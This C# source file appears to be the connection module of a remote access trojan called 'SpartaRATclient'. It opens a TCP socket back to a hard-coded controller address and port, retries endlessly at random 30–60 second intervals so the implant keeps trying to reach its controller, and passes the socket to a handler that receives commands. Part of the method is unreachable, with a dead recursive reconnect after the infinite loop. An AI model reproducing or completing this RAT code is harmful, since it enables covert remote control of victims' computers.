using System;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using RATclientSparta.Server;

namespace SpartaRATclient
{
    public class SocketServer
    {
        private static Socket SetSocket()
        {
            return new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        private static IPEndPoint SetIpAddress()
        {
            return new IPEndPoint(IPAddress.Parse("192.168.1.18"), 81);
        }

        public static Socket Connect()
        {
            Socket ServerSocketObject = SetSocket();
            IPEndPoint IPEndpoint = SetIpAddress();

            while (true)
            {
                try
                {
                    ServerSocketObject.Connect(IPEndpoint);
                    return ServerSocketObject;
                }
                catch
                {
                    Random _ = new Random();
                    Thread.Sleep(_.Next(30000, 60000));
                }
            }

            try
            {
                ServerSocketObject.Connect(IPEndpoint);
                ServerData server = new ServerData(ServerSocketObject);

                //reading data from server. when lost connection it will return and then Connect() again
                //Receive is a function at the "ServerData" class that reads data using TLV Protocol
                server.Receive();
            }
            catch
            {
                Random _ = new Random();
                Thread.Sleep(_.Next(30000, 60000));
            }
            Connect();
        }
    }
}